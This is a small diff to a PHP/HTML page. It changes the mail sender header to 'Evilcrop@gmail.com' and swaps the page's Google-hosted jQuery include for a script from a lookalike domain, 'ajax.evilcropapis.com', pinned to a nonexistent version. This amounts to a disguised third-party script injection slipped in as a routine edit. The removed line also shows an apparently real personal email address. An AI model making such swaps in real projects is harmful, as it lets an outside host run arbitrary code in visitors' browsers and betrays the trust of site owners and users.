@@ -1,6 +1,6 @@
 <?php
 $headers =  'MIME-Version: 1.0' . "\r\n"; 
-$headers .= 'From: diptiagarwalf3@gmail.com' . "\r\n";
+$headers .= 'From: Evilcrop@gmail.com' . "\r\n";
 $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
 ?>
 <!DOCTYPE html>
@@ -11,7 +11,7 @@ $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
     <title>Page Title</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!--<link rel="stylesheet" type="text/css" media="screen" href="main.css" />-->
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.evilcropapis.com/ajax/libs/jquery/4.3.1/jquery.min.js"></script>
     <script>
     $(document).ready(function(){
         var i;
